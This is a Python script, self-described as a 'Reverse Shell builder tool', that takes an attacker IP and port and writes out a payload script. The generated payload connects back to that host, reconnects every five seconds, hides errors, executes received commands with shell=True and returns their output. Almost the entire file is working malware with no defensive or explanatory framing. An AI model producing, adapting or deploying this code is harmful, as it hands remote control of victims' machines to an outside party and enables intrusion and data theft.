import argparse
import os

def main():
    parser = argparse.ArgumentParser(description="Reverse Shell builder tool")
    parser.add_argument("-i", "--ip", required=True)
    parser.add_argument("-p", "--port", required=True)
    parser.add_argument("-o", "--output", required=True)

    args = parser.parse_args()

    print(f"[*] Building: {args.output}")
    print("[*] Generating configuration...")

    content = """
import socket
import subprocess
import os
import time

HOST = "{ip}"
PORT = {port}

def main():
    while True:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            cwd = os.getcwd()
            s.sendall(f"{{cwd}}||__prompt__".encode() + b"__end__")

            while True:
                cmd = s.recv(4096).decode(errors="ignore")
                if not cmd:
                    break

                if cmd == "__exit__":
                    return

                if cmd.startswith("cd "):
                    try:
                        os.chdir(cmd[3:].strip())
                    except:
                        pass
                    cwd = os.getcwd()
                    s.sendall(f"{{cwd}}||".encode() + b"__end__")
                    continue

                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                cwd = os.getcwd()
                output = result.stdout + result.stderr
                payload = f"{{cwd}}||{{output}}"
                s.sendall(payload.encode() + b"__end__")

        except:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

        time.sleep(5)

if __name__ == "__main__":
    main()
""".format(ip=args.ip, port=args.port)

    with open(args.output, "w") as f:
        f.write(content)

    print("[+] Build completed")

    size = os.path.getsize(args.output)
    print(f"[+] Output: {args.output} ({size} bytes)")

if __name__ == "__main__":
    main()
